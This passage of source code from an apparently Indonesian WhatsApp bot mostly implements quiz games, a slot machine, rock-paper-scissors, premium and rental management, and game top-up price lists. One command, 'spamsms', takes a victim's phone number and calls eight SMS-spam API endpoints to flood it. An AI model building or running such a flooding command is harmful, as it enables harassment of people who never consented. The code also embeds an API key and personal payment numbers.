                            if (kuismath.hasOwnProperty(sender.split('@')[0])) {
                                   console.log(color("Jawaban: " + jawaban))
                                   reply("*Jawaban*: " + jawaban)
                                   delete kuismath[sender.split('@')[0]]
                                   fs.writeFileSync("./database/kuismath.json", JSON.stringify(kuismath))
                            }
                            gameAdd(sender, glimit)
                            break
                     case 'tebakgambar':
                            if (tebakgambar.hasOwnProperty(sender.split('@')[0])) return reply("Selesein yg sebelumnya dulu atuh")
                            get_result = await fetchJson(`http://zekais-api.herokuapp.com/tebakgambar`)
                            ini_image = get_result.soal
                            jawaban = get_result.jawaban
                            kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
                            ini_buffer = await getBuffer(ini_image)
                            dha.sendMessage(from, ini_buffer, image, {
                                   quoted: mek,
                                   caption: 'Silahkan jawab soal berikut ini\n\nPetunjuk :' + kisi_kisi + '\nWaktu : 30s'
                            }).then(() => {
                                   tebakgambar[sender.split('@')[0]] = jawaban.toLowerCase()
                                   fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
                            })
                            await sleep(30000)
                            if (tebakgambar.hasOwnProperty(sender.split('@')[0])) {
                                   console.log(color("Jawaban: " + jawaban))
                                   reply("*Jawaban*: " + jawaban)
                                   delete tebakgambar[sender.split('@')[0]]
                                   fs.writeFileSync("./database/tebakgambar.json", JSON.stringify(tebakgambar))
                            }
                            gameAdd(sender, glimit)
                            break
                     case 'siapaaku':
                            if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                            if (tebaksiapaaku.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
                            get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/siapaaku?apikey=${setting.lolkey}`)
                            get_result = get_result.result
                            jawaban = get_result.answer
                            kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
                            pertanyaan = get_result.question
                            dha.sendMessage(from, '*+* ```Tebak Siapakah Aku```\n\n• *soal* :' + pertanyaan + '\n• *kisi²* :' + kisi_kisi, text, {
                                   quoted: mek
                            }).then(() => {
                                   tebaksiapaaku[sender.split('@')[0]] = jawaban.toLowerCase()
                                   fs.writeFileSync("./database/tebaksiapaaku.json", JSON.stringify(tebaksiapaaku))
                            })
                            await sleep(30000)
                            if (tebaksiapaaku.hasOwnProperty(sender.split('@')[0])) {
                                   console.log(color("Jawaban: " + jawaban))
                                   reply("Jawaban: " + jawaban)
                                   delete tebaksiapaaku[sender.split('@')[0]]
                                   fs.writeFileSync("./database/tebaksiapaaku.json", JSON.stringify(tebaksiapaaku))
                            }
                            gameAdd(sender, glimit)
                            break
                     case 'tebakkata':
                            if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                            if (tebakata.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
                            get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/kata?apikey=${setting.lolkey}`)
                            get_result = get_result.result
                            jawaban = get_result.jawaban
                            pertanyaan = get_result.pertanyaan
                            dha.sendMessage(from, '*+* ```Tebak Kata```\n\n• *Soal* :' + pertanyaan + '\n• *Waktu :* 30s', text, {
                                   quoted: mek
                            }).then(() => {
                                   tebakata[sender.split('@')[0]] = jawaban.toLowerCase()
                                   fs.writeFileSync("./database/tebakata.json", JSON.stringify(tebakata))
                            })
                            await sleep(30000)
                            if (tebakata.hasOwnProperty(sender.split('@')[0])) {
                                   console.log(color("Jawaban: " + jawaban))
                                   reply("Jawaban: " + jawaban)
                                   delete tebakata[sender.split('@')[0]]
                                   fs.writeFileSync("./database/tebakata.json", JSON.stringify(tebakata))
                            }
                            gameAdd(sender, glimit)
                            break
                     case 'tebaklirik':
                            if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                            if (tebaklirik.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
                            get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/lirik?apikey=${setting.lolkey}`)
                            get_result = get_result.result
                            jawaban = get_result.answer
                            kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
                            pertanyaan = get_result.question
                            dha.sendMessage(from, '*+* ```Tebak Lirik```\n\n• *Soal* :' + pertanyaan + '\n• *Kisi²* :' + kisi_kisi, text, {
                                   quoted: mek
                            }).then(() => {
                                   tebaklirik[sender.split('@')[0]] = jawaban.toLowerCase()
                                   fs.writeFileSync("./database/tebaklirik.json", JSON.stringify(tebaklirik))
                            })
                            await sleep(30000)
                            if (tebaklirik.hasOwnProperty(sender.split('@')[0])) {
                                   console.log(color("Jawaban: " + jawaban))
                                   reply("Jawaban: " + jawaban)
                                   delete tebaklirik[sender.split('@')[0]]
                                   fs.writeFileSync("./database/tebaklirik.json", JSON.stringify(tebaklirik))
                            }
                            gameAdd(sender, glimit)
                            break
                     case 'tebakjenaka':
                            if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                            if (tebakjenaka.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
                            get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/jenaka?apikey=${setting.lolkey}`)
                            get_result = get_result.result
                            jawaban = get_result.answer
                            kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
                            pertanyaan = get_result.question
                            dha.sendMessage(from, '*+* ```Tebak Jenaka```\n\n• *Soal* :' + pertanyaan + '\n• *Kisi²* :' + kisi_kisi, text, {
                                   quoted: mek
                            }).then(() => {
                                   tebakjenaka[sender.split('@')[0]] = jawaban.toLowerCase()
                                   fs.writeFileSync("./database/tebakjenaka.json", JSON.stringify(tebakjenaka))
                            })
                            await sleep(30000)
                            if (tebakjenaka.hasOwnProperty(sender.split('@')[0])) {
                                   console.log(color("Jawaban: " + jawaban))
                                   reply("Jawaban: " + jawaban)
                                   delete tebakjenaka[sender.split('@')[0]]
                                   fs.writeFileSync("./database/tebakjenaka.json", JSON.stringify(tebakjenaka))
                            }
                            gameAdd(sender, glimit)
                            break
                     case 'kimiakuis':
                            if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                            if (tebakimia.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
                            get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/unsurkimia?apikey=${setting.lolkey}`)
                            get_result = get_result.result
                            jawaban = get_result.lambang
                            pertanyaan = get_result.nama
                            dha.sendMessage(from, '*+* ```Tebak Kimia```\n\n• *Soal* :' + pertanyaan + '\n• *Waktu :* 30s', text, {
                                   quoted: mek
                            }).then(() => {
                                   tebakimia[sender.split('@')[0]] = jawaban.toLowerCase()
                                   fs.writeFileSync("./database/tebakimia.json", JSON.stringify(tebakimia))
                            })
                            await sleep(30000)
                            if (tebakimia.hasOwnProperty(sender.split('@')[0])) {
                                   console.log(color("Jawaban: " + jawaban))
                                   reply("Jawaban: " + jawaban)
                                   delete tebakimia[sender.split('@')[0]]
                                   fs.writeFileSync("./database/tebakimia.json", JSON.stringify(tebakimia))
                            }
                            gameAdd(sender, glimit)
                            break
                     case 'tebakbendera':
                            if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                            if (tebakbendera.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
                            get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/bendera?apikey=${setting.lolkey}`)
                            get_result = get_result.result
                            jawaban = get_result.name
                            kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
                            pertanyaan = get_result.flag
                            dha.sendMessage(from, '*+* ```Tebak Bendera```\n\n• *Bendera* :' + pertanyaan + '\n• *kisi²* :' + kisi_kisi, text, {
                                   quoted: mek
                            }).then(() => {
                                   tebakbendera[sender.split('@')[0]] = jawaban.toLowerCase()
                                   fs.writeFileSync("./database/tebakbendera.json", JSON.stringify(tebakbendera))
                            })
                            await sleep(30000)
                            if (tebakbendera.hasOwnProperty(sender.split('@')[0])) {
                                   console.log(color("Jawaban: " + jawaban))
                                   reply("Jawaban: " + jawaban)
                                   delete tebakbendera[sender.split('@')[0]]
                                   fs.writeFileSync("./database/tebakbendera.json", JSON.stringify(tebakbendera))
                            }
                            gameAdd(sender, glimit)
                            break
                     case 'susunkata':
                            if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                            if (susunkata.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
                            get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/susunkata?apikey=${setting.lolkey}`)
                            get_result = get_result.result
                            jawaban = get_result.jawaban
                            pertanyaan = get_result.pertanyaan
                            dha.sendMessage(from, '*+* ```Susun Kata```\n\n• *Soal* :' + pertanyaan + '\n• *Waktu :* 30s', text, {
                                   quoted: mek
                            }).then(() => {
                                   susunkata[sender.split('@')[0]] = jawaban.toLowerCase()
                                   fs.writeFileSync("./database/susunkata.json", JSON.stringify(susunkata))
                            })
                            await sleep(30000)
                            if (susunkata.hasOwnProperty(sender.split('@')[0])) {
                                   console.log(color("Jawaban: " + jawaban))
                                   reply("Jawaban: " + jawaban)
                                   delete susunkata[sender.split('@')[0]]
                                   fs.writeFileSync("./database/susunkata.json", JSON.stringify(susunkata))
                            }
                            gameAdd(sender, glimit)
                            break
                     case 'asahotak':
                            if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                            if (asahotak.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
                            get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/asahotak?apikey=${setting.lolkey}`)
                            get_result = get_result.result
                            jawaban = get_result.jawaban
                            kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
                            pertanyaan = get_result.pertanyaan
                            dha.sendMessage(from, '*+* ```Asah Otak```\n\n• *soal* :' + pertanyaan + '\n• *kisi²* :' + kisi_kisi, text, {
                                   quoted: mek
                            }).then(() => {
                                   asahotak[sender.split('@')[0]] = jawaban.toLowerCase()
                                   fs.writeFileSync("./database/asahotak.json", JSON.stringify(asahotak))
                            })
                            await sleep(30000)
                            if (asahotak.hasOwnProperty(sender.split('@')[0])) {
                                   console.log(color("Jawaban: " + jawaban))
                                   reply("Jawaban: " + jawaban)
                                   delete asahotak[sender.split('@')[0]]
                                   fs.writeFileSync("./database/asahotak.json", JSON.stringify(asahotak))
                            }
                            gameAdd(sender, glimit)
                            break
                     case 'caklontong':
                            if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
                            if (caklontong.hasOwnProperty(sender.split('@')[0])) return reply("Masih ada soal yg belum terjawab")
                            get_result = await fetchJson(`https://lolhuman.herokuapp.com/api/tebak/caklontong2?apikey=${setting.lolkey}`)
                            get_result = get_result.result
                            jawaban = get_result.answer
                            kisi_kisi = jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
                            pertanyaan = get_result.question
                            dha.sendMessage(from, '*+* ```Caklontong```\n\n• *soal* :' + pertanyaan + '\n• *kisi²* :' + kisi_kisi, text, {
                                   quoted: mek
                            }).then(() => {
                                   caklontong[sender.split('@')[0]] = jawaban.toLowerCase()
                                   fs.writeFileSync("./database/caklontong.json", JSON.stringify(caklontong))
                            })
                            await sleep(30000)
                            if (caklontong.hasOwnProperty(sender.split('@')[0])) {
                                   console.log(color("Jawaban: " + jawaban))
                                   reply("Jawaban: " + jawaban)
                                   delete caklontong[sender.split('@')[0]]
                                   fs.writeFileSync("./database/caklontong.json", JSON.stringify(caklontong))
                            }
                            gameAdd(sender, glimit)
                            break
                     case 'slot':
                            const sotoy = ['🍊 : 🍒 : 🍐', '🍒 : ?? : 🍊', '?? : 🍒 : 🍐', '🍊 : 🍋 : 🔔', '🔔 : 🍒 : 🍐', '🔔 : 🍒 : 🍊', '🍊 : 🍋 : 🔔', '🍐 : 🍒 : 🍋', '🍐 : 🍐 : 🍐', '🍊 : 🍒 : 🍒', '🔔 : 🔔 : 🍇', '🍌 : 🍒 : 🔔', '🍐 : 🔔 : 🔔', '🍊 : 🍋 : 🍒', '🍋 : 🍋 : 🍌', '🔔 : 🔔 : 🍇', '🔔 : 🍐 : 🍇', '🔔 : 🔔 : 🔔', '🍒 : 🍒 : 🍒', '🍌 : 🍌 : 🍌', '🍇 : ?? : 🍇']
                            somtoy = sotoy[Math.floor(Math.random() * (sotoy.length))]
                            somtoyy = sotoy[Math.floor(Math.random() * (sotoy.length))]
                            somtoyyy = sotoy[Math.floor(Math.random() * (sotoy.length))]
                            if (somtoyy == '🍌 : 🍌 : 🍌') {
                                   reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
                            } else if (somtoyy == '?? : 🍒 : 🍒') {
                                   reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
                            } else if (somtoyy == '🔔 : 🔔 : 🔔') {
                                   reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
                            } else if (somtoyy == '?? : 🍐 : 🍐') {
                                   reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
                            } else if (somtoyy == '🍇 : 🍇 : 🍇') {
                                   reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU WIN*  ]`)
                            } else {
                                   reply(`[  🎰 | *SLOT* ]\n---------------------\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n---------------------\n[  *YOU LOSE*  ]`)
                            }
                            break
                     case 'suit': //nyolong dari zenz
                            if (!q) return reply(`Kirim perintah ${prefix}suit gunting / batu / kertas`)
                            const userspilih = q
                            if (!userspilih.match(/batu|gunting|kertas/)) return reply(`Pilih batu, kertas, gunting`)
                            var computer = Math.random();
                            if (computer < 0.34) {
                                   computer = 'batu';
                            } else if (computer >= 0.34 && computer < 0.67) {
                                   computer = 'gunting';
                            } else {
                                   computer = 'kertas';
                            }
                            if (userspilih == computer) {
                                   reply(`Pertandingan Seri!`)
                            } else if (userspilih == 'batu') {
                                   if (computer == 'gunting') {
                                          reply(`Kamu memilih Batu dan bot Gunting\nKamu menang!`)
                                   } else {
                                          reply(`Kamu memilih Batu dan bot memilih Kertas\nKamu kalah!`)
                                   }
                            } else if (userspilih == 'gunting') {
                                   if (computer == 'batu') {
                                          reply(`Kamu memilih Gunting dan bot memilih Batu\nKamu kalah!`)
                                   } else {
                                          reply(`Kamu memilih Gunting dan bot Kertas\nKamu menang!`)
                                   }
                            } else if (userspilih == 'kertas') {
                                   if (computer == 'batu') {
                                          reply(`Kamu memilih Kertas dan bot Batu\nKamu menang!`)
                                   } else {
                                          reply(`Kamu memilih Kertas dan bot memilih Gunting\nKamu kalah`)
                                   }
                            }
                            break
                            //------------------< Sewa >-------------------
                     case 'sewa':
                            if (!isGroup) return reply(mess.only.group)
                            if (!isOwner) return reply(mess.only.owner)
                            if (args.length < 1) return reply(`Penggunaan :\n*${prefix}sewa* add/del waktu`)
                            if (args[0].toLowerCase() === 'add') {
                                   _sewa.addSewaGroup(from, args[1], sewa)
                                   reply(`Success`)
                            } else if (args[0].toLowerCase() === 'del') {
                                   sewa.splice(_sewa.getSewaPosition(from, sewa), 1)
                                   fs.writeFileSync('./database/group/sewa.json', JSON.stringify(sewa))
                                   reply(mess.success)
                            } else {
                                   reply(`Penggunaan :\n*${prefix}sewa* add/del waktu`)
                            }
                            break
                     case 'sewalist':
                     case 'listsewa':
                            let txtnyee = `List Sewa\nJumlah : ${sewa.length}\n\n`
                            for (let i of sewa) {
                                   let cekvipp = ms(i.expired - Date.now())
                                   txtnyee += `*ID :* ${i.id} \n*Expire :* ${cekvipp.days} day(s) ${cekvipp.hours} hour(s) ${cekvipp.minutes} minute(s) ${cekvipp.seconds} second(s)\n\n`
                            }
                            reply(txtnyee)
                            break
                     case 'sewacheck':
                     case 'ceksewa':
                            if (!isGroup) return reply(mess.only.group)
                            if (!isSewa) return reply(`Group ini tidak terdaftar dalam list sewabot. Ketik ${prefix}sewabot untuk info lebih lanjut`)
                            let cekvip = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
                            let premiumnya = `*「 SEWA EXPIRE 」*\n\n➸ *ID*: ${from}\n➸ *Expired :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s)`
                            reply(premiumnya)
                            break
                     case 'spamsms':
                            if (args.length == 0) return reply(`Example: ${prefix + command} 08303030303030`)
                            nomor = args[0]
                            await fetchJson(`https://api.lolhuman.xyz/api/sms/spam1?apikey=genbotkey&nomor=${nomor}`)
                            await fetchJson(`https://api.lolhuman.xyz/api/sms/spam2?apikey=genbotkey&nomor=${nomor}`)
                            await fetchJson(`https://api.lolhuman.xyz/api/sms/spam3?apikey=genbotkey&nomor=${nomor}`)
                            await fetchJson(`https://api.lolhuman.xyz/api/sms/spam4?apikey=genbotkey&nomor=${nomor}`)
                            await fetchJson(`https://api.lolhuman.xyz/api/sms/spam5?apikey=genbotkey&nomor=${nomor}`)
                            await fetchJson(`https://api.lolhuman.xyz/api/sms/spam6?apikey=genbotkey&nomor=${nomor}`)
                            await fetchJson(`https://api.lolhuman.xyz/api/sms/spam7?apikey=genbotkey&nomor=${nomor}`)
                            await fetchJson(`https://api.lolhuman.xyz/api/sms/spam8?apikey=genbotkey&nomor=${nomor}`)
                            reply("Success")
                            break
                            //------------------< Premium >-------------------
                     case 'premium':
                            if (!isOwner) return reply(mess.only.owner)
                            if (args[0] === 'add') {
                                   if (mek.message.extendedTextMessage != undefined) {
                                          mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid

                                          premium.addPremiumUser(mentioned[0], args[2], _premium)
                                          reply(`*「 PREMIUM ADDED 」*\n\n➸ *ID*: ${mentioned[0]}\n➸ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)

                                   } else {

                                          premium.addPremiumUser(args[1] + '@s.whatsapp.net', args[2], _premium)
                                          reply(`*「 PREMIUM ADDED 」*\n\n➸ *ID*: ${args[1]}@s.whatsapp.net\n➸ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
                                   }
                            } else if (args[0] === 'del') {
                                   if (mek.message.extendedTextMessage != undefined) {
                                          mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
                                          _premium.splice(premium.getPremiumPosition(mentioned[0], _premium), 1)
                                          fs.writeFileSync('./database/user/premium.json', JSON.stringify(_premium))
                                          reply(mess.success)
                                   } else {
                                          _premium.splice(premium.getPremiumPosition(args[1] + '@s.whatsapp.net', _premium), 1)
                                          fs.writeFileSync('./database/user/premium.json', JSON.stringify(_premium))
                                          reply(mess.success)
                                   }
                            } else {
                                   reply(mess.wrongFormat)
                            }
                            break
                     case 'premiumcheck':
                     case 'cekpremium':
                            if (!isPremium) return reply(mess.only.premium)
                            const cekExp = ms(await premium.getPremiumExpired(sender, _premium) - Date.now())
                            reply(`*「 PREMIUM EXPIRE 」*\n\n➸ *ID*: ${sender}\n➸ *Premium left*: ${cekExp.days} day(s) ${cekExp.hours} hour(s) ${cekExp.minutes} minute(s)`)
                            break
                     case 'listprem':
                     case 'listpremium':
                            let txt = `「 *PREMIUM USER LIST* 」\n\n`
                            let men = [];
                            for (let i of _premium) {
                                   men.push(i.id)
                                   const checkExp = ms(i.expired - Date.now())
                                   txt += `➸ *ID :* @${i.id.split("@")[0]}\n➸ *Expired*: ${checkExp.days} day(s) ${checkExp.hours} hour(s) ${checkExp.minutes} minute(s)\n\n`
                            }
                            mentions(txt, men, true)
                            break
                     case 'belipremium':
                     case 'buypremium':
                     case 'sewabot':
                            gopeynya = 'https://i.postimg.cc/c47BWZGD/IMG-20210929-WA0065.jpg'
                            teksnya = `*── 「 PRICE LIST 」 ──*

*Tarif Premium User adalah 10K Perbulan*
*Keuntungan Premium Diantaranya:*
♲ *Bebas memakai fitur premium*
♲ *Dapat Informasi Lebih dulu akan Update, Nomor Bot Baru (Jika Terbanned), dan Lainnya*

*Jika Tertarik,Kalian Bisa Bayar Melalui Metode Pembayaran di Bawah:*
*Dana : 085777727179*
*Gopay : scan diatas*
*Atau Gopay pada gambar diatas*

*Info Lebih Lengkap Chat Owner, Ketik ${prefix}owner*
*_note_*:
*Pembelian Premium yang disertai SewaBot hanya akan membayar 20K (Diskon 5K)*`
                            dha.sendMessage(from, await getBuffer(gopeynya), image, {
                                   quoted: mek,
                                   caption: teksnya
                            })
                            break
                            //------------------< store menu >-------------------  
                     case 'bayar':
                            gopeynya = 'https://i.postimg.cc/c47BWZGD/IMG-20210929-WA0065.jpg'
                            teksnya = ` *「PAYMENT」*
• GOPAY : scan diatas
• DANA : 081220670449
• OVO : scan diatas
• QRISS DI ATAS 
━━━━━━━━━━━━━━━━━━━━`
                            dha.sendMessage(from, await getBuffer(gopeynya), image, {
                                   quoted: ftoko,
                                   caption: teksnya
                            })
                            break

                     case 'dmff':
                            gopeynya = 'https://i.postimg.cc/L4wjFw1q/IMG-20210929-WA0233.jpg'
                            teksnya = `*「DIAMOND FREEFIRE」*
━━━━━━━━━━━━━━━━━━━━
• *10 DIAMOND = Rp 2.000*
• *20 DIAMOND = Rp 5.000*
• *50 DIAMOND = Rp 8.000*
• *70 DIAMOND = Rp 10.000*
• *100 DIAMOND = Rp 15.000*
• *120 DIAMOND = Rp 18.000*
• *140 DIAMOND = Rp 20.000*
• *210 DIAMOND = Rp 30.000*
• *280 DIAMOND = Rp 40.000*
• *355 DIAMOND = Rp 50.000*
• *425 DIAMOND = Rp 60.000*
• *495 DIAMOND = Rp 70.000*
• *720 DIAMOND = Rp 100.000*
• *860 DIAMOND = Rp 115.000*
• *930 DIAMOND = Rp 125.000*
• *1440 DIAMOND = Rp 190.000*
• *1450 DIAMOND = Rp 200.000*
• *2000 DIAMOND = Rp 255.000*
• *2140 DIAMOND = Rp 285.000*
• *2180 DIAMOND = Rp 290.000*
• *M.MINGGUAN = Rp 30.000*
• *M.BULANAN = Rp 118.000*
━━━━━━━━━━━━━━━━━━━━
*NOTE :*
_HARGA BISA BERUBAH_
_SEWAKTU WAKTU_
_BUDAYAKAN BERTANYA_
_SEBELUM PEMBELIAN_
JIKA BERMINAT 
#order
ATAU HUBUNGIN HUB :
   *(*
wa.me/6281220670449`
                            dha.sendMessage(from, await getBuffer(gopeynya), image, {
                                   quoted: ftoko,
                                   caption: teksnya
                            })
                            break
                     case 'dmml':
                            gopeynya = 'https://i.postimg.cc/L4wjFw1q/IMG-20210929-WA0233.jpg'
                            teksnya = `*「DIAMOND MOBA」*
━━━━━━━━━━━━━━━━━━━━
• *12 DIAMOND = Rp 5.000*
• *28 DIAMOND = Rp 10.000*
• *36 DIAMOND = Rp 12.000*
• *59 DIAMOND = Rp 19.000*
• *86 DIAMOND = Rp 20.000*
• *172 DIAMOND = Rp 39.000*
• *257 DIAMOND = Rp 59.000*
• *344 DIAMOND = Rp 75.000*
• *429 DIAMOND = Rp 95.000*
• *514 DIAMOND = Rp 115.000*
• *706 DIAMOND = Rp 150.000*
• *878 DIAMOND = Rp 188.000*
• *963 DIAMOND = Rp 205.000*
• *1412 DIAMOND = Rp 300.000*
• *2195 DIAMOND = Rp 445.000*
• *3688 DIAMOND = Rp 720.000*
• *STARTLIGHT M = Rp 128.000*
• *TWILIGHT PASS = Rp 128.000*
━━━━━━━━━━━━━━━━━━━━
*NOTE :*
_HARGA BISA BERUBAH_
_SEWAKTU WAKTU_
_BUDAYAKAN BERTANYA_
_SEBELUM PEMBELIAN_
JIKA BERMINAT 
#order
ATAU HUBUNGIN HUB :
   *©hzkyx*
wa.me/6281220670449`
                            dha.sendMessage(from, await getBuffer(gopeynya), image, {
                                   quoted: ftoko,
                                   caption: teksnya
                            })
                            break
                     case 'cpcod':
                            gopeynya = 'https://i.postimg.cc/L4wjFw1q/IMG-20210929-WA0233.jpg'
                            teksnya = `*「CP CALL OF DUTTY」*
━━━━━━━━━━━━━━━━━━━━
• *26 + 5 CP = Rp 7.000*
• *53 + 9 CP = Rp 12.000*
• *106 + 21 CP = Rp 22.000*
• *264 + 53 CP = Rp 53.000*
• *528 + 106 CP = Rp 102.000*
• *1056 + 317 CP = Rp 202.000*
━━━━━━━━━━━━━━━━━━━━
*NOTE :*
_HARGA BISA BERUBAH_
_SEWAKTU WAKTU_
_BUDAYAKAN BERTANYA_
_SEBELUM PEMBELIAN_
JIKA BERMINAT 
#order
ATAU HUBUNGIN HUB :
   *©hzkyx*
wa.me/6281220670449`
                            dha.sendMessage(from, await getBuffer(gopeynya), image, {
                                   quoted: ftoko,
                                   caption: teksnya
                            })
                            break
                     case 'cashpb':
                            gopeynya = 'https://i.postimg.cc/L4wjFw1q/IMG-20210929-WA0233.jpg'
                            teksnya = `*「CASH POIN BLANK」*
━━━━━━━━━━━━━━━━━━━━
• *1200 PB CASH = Rp 11.000*
• *2400 PB CASH = Rp 21.000*
• *6000 PB CASH = Rp 52.000*
• *12000 PB CASH = Rp 100.000*
━━━━━━━━━━━━━━━━━━━━
*NOTE :*
_HARGA BISA BERUBAH_
_SEWAKTU WAKTU_
_BUDAYAKAN BERTANYA_
_SEBELUM PEMBELIAN_
JIKA BERMINAT 
#order
ATAU HUBUNGIN HUB :
   *©hzkyx*
wa.me/6281220670449`
                            dha.sendMessage(from, await getBuffer(gopeynya), image, {
                                   quoted: toko,
                                   caption: teksnya
                            })
                            break
                     case 'catcoin':
                            gopeynya = 'https://i.postimg.cc/L4wjFw1q/IMG-20210929-WA0233.jpg'
                            teksnya = `*「CAT COIN RAGNAROK」*
━━━━━━━━━━━━━━━━━━━━
• *1 BIG CAT COIN = Rp 6.000*
• *3 BIG CAT COIN = Rp 10.000*
• *4 BIG CAT COIN = Rp 13.000*
• *8 BIG CAT COIN = Rp 23.000*
• *20 BIG CAT COIN = Rp 62.000*
• *40 BIG CAT COIN = Rp 102.000*
━━━━━━━━━━━━━━━━━━━━
*NOTE :*
_HARGA BISA BERUBAH_
_SEWAKTU WAKTU_
_BUDAYAKAN BERTANYA_
_SEBELUM PEMBELIAN_
JIKA BERMINAT 
#order
ATAU HUBUNGIN HUB :
   *©hzkyx*
wa.me/6282287486762`
                            dha.sendMessage(from, await getBuffer(gopeynya), image, {
                                   quoted: ftoko,
                                   caption: teksnya
                            })
                            break
                     case 'candysausage':
                            gopeynya = 'https://i.postimg.cc/L4wjFw1q/IMG-20210929-WA0233.jpg'
                            teksnya = `*「CANDY SAUSAGE」*
━━━━━━━━━━━━━━━━━━━━
• *60 CANDY SAUSAGE = Rp 16.000*
• *180 CANDY SAUSAGE = Rp 10.000*
• *316 CANDY SAUSAGE = Rp 50.000*
• *718 CANDY SAUSAGE = Rp 80.000*
• *1368 CANDY SAUSAGE = Rp 150.000*
• *2118 CANDY SAUSAGE = Rp 455.000*
━━━━━━━━━━━━━━━━━━━━
*NOTE :*
_HARGA BISA BERUBAH_
_SEWAKTU WAKTU_
_BUDAYAKAN BERTANYA_
_SEBELUM PEMBELIAN_
JIKA BERMINAT 
#order
ATAU HUBUNGIN HUB :
   *©hzkyx*
wa.me/6282287486762`
                            dha.sendMessage(from, await getBuffer(gopeynya), image, {
                                   quoted: ftoko,
                                   caption: teksnya
                            })
                            break
                     case 'ucpubg':
                            gopeynya = 'https://i.postimg.cc/L4wjFw1q/IMG-20210929-WA0233.jpg'
                            teksnya = `*「UC PUBG」*
━━━━━━━━━━━━━━━━━━━━
• *25 UC = Rp 8.000*
• *35 UC = Rp 10.000*
• *50 UC = Rp 12.000*
• *70 UC = Rp 17.000*
• *125 UC = Rp 28.000*
• *120 UC = Rp 18.000*
• *150 UC = Rp 35.000*
• *210 UC = Rp 45.000*
• *250 UC = Rp 53.000*
• *355 UC = Rp 50.000*
• *500 UC = Rp 100.000*
• *700 UC = Rp 139.000*
• *825 UC = Rp 160.000*
• *910 UC = Rp 179.000*
• *1120 UC = Rp 219.000*
• *1400 UC = Rp 273.000*
• *1750 UC = Rp 340.000*
━━━━━━━━━━━━━━━━━━━━
*NOTE :*
_HARGA BISA BERUBAH_
_SEWAKTU WAKTU_
_BUDAYAKAN BERTANYA_
_SEBELUM PEMBELIAN_
JIKA BERMINAT 
#order
ATAU HUBUNGIN HUB :
   *©hzkyx*
wa.me/6281220670449`
                            dha.sendMessage(from, await getBuffer(gopeynya), image, {
                                   quoted: ftext,
                                   caption: teksnya
                            })
                            break
                     case 'order':
                            buttons = [{
                                   buttonId: `${prefix}masukandata`,
                                   buttonText: {
                                          displayText: `MASUKAN ID`
                                   },
                                   type: 1
                            }, {
                                   buttonId: `${prefix}bayar`,
                                   buttonText: {
                                          displayText: 'LAKUKAN PEMBAYARAN'
                                   },
                                   type: 1
                            }]
